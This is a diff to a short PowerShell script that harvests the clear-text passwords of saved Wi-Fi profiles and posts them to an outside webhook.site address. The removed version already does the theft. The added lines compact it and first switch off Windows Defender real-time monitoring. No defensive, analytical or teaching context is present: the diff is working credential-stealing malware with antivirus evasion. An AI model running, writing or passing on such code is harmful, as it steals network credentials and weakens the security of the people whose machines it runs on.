@@ -1,11 +1,6 @@
-$profiles = netsh wlan show profiles | Select-String "\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
-$wifiData = foreach ($name in $profiles) {
-    $result = netsh wlan show profile name="$name" key=clear
-    $pass = $result | Select-String "(Key Content|Contenido de la clave)\s+\:(.+)$" | ForEach-Object { $_.Matches.Groups[2].Value.Trim() }
-    if ($pass) { [PSCustomObject]@{ SSID = $name; Password = $pass } }
+Set-MpPreference -DisableRealtimeMonitoring $true -EA SilentlyContinue
+$w = netsh wlan show prof | sls ':(.+)$' | %{$_.Matches.Groups[1].Value.Trim()} | %{$n=$_; $k=(netsh wlan show prof name="$n" key=clear | sls 'Key Content\W+:(.+)$' | %{$_.Matches.Groups[1].Value.Trim()}); if($k){"SSID:$n | Pass:$k"}}
+$data = $w | Out-String
+if ($data.Trim()) {
+    Invoke-RestMethod -Uri "https://webhook.site/8fae434e-1ec5-4dce-94e3-d1bf51a78a9c" -Method Post -Body $data -UseBasicParsing
 }
-if ($wifiData) {
-    $payload = $wifiData | ConvertTo-Json
-    Invoke-WebRequest -Uri "https://webhook.site/8fae434e-1ec5-4dce-94e3-d1bf51a78a9c" -Method Post -Body $payload -ContentType "application/json" -UseBasicParsing
-}
-Invoke-WebRequest -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -UseBasicParsing
